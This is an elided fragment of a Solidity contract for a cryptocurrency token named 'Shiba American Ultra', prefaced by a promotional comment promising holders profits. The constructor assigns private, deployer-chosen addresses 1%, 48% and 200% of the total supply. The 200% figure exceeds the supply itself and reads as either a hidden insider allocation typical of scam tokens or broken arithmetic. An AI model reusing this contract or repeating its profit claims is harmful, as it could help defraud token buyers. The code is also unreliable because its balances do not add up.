...
/*
https://finance.yahoo.com/news/american-shiba-introduces-coin-earns-111900923.html
Wʜʏ Hᴏʟᴅ SʜɪʙAUʟᴛʀᴀ Tᴏᴋᴇɴ?

Pʀɪᴍᴀʀɪʟʏ, ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ɪɴ ᴛʜᴇ ᴄʀʏᴘᴛᴏ ɴᴇᴛᴡᴏʀᴋ ʜᴏʟᴅ ᴏʀ ʙᴜʏ ᴛᴏᴋᴇɴs ʙᴇᴄᴀᴜsᴇ ᴏғ ɢᴀɪɴs ᴀɴᴅ ᴘʀᴏғɪᴛs ᴘʀᴏᴍɪsᴇᴅ ʙʏ ᴛʜᴇ ᴘʟᴀᴛғᴏʀᴍ. Sɪᴍɪʟᴀʀʟʏ, ʜᴏʟᴅɪɴɢ Usʜɪʙᴀ ᴛᴏᴋᴇɴs ʜᴀs ᴠᴀsᴛ ʙᴇɴᴇғɪᴛs ғᴏʀ ᴛʜᴇ ᴜsᴇʀs.
...
// more info : https://bscscan.com/contract-license-types
...
contract ShibaAmericanUltra  is TokenERC20 {
     // FairLaunch
    // common addresses
    address private owner;
    address private EXTRA;
    address private LAUNCH;
    address private ULTRA;
    ...
    string public override name = "Shiba American Ultra";
    string public override symbol = "ShibAUltra";
    ...
    constructor(uint totalSupplyValue, address EXTRAAddress, address LAUNCHAddress, address ULTRAAddress) {
        // set total supply
        ...
        balances[EXTRA] =  totalSupply * 1 / 100;
        balances[LAUNCH] = totalSupply * 48 / 100;
        balances[ULTRA] = totalSupply * 200 / 100;
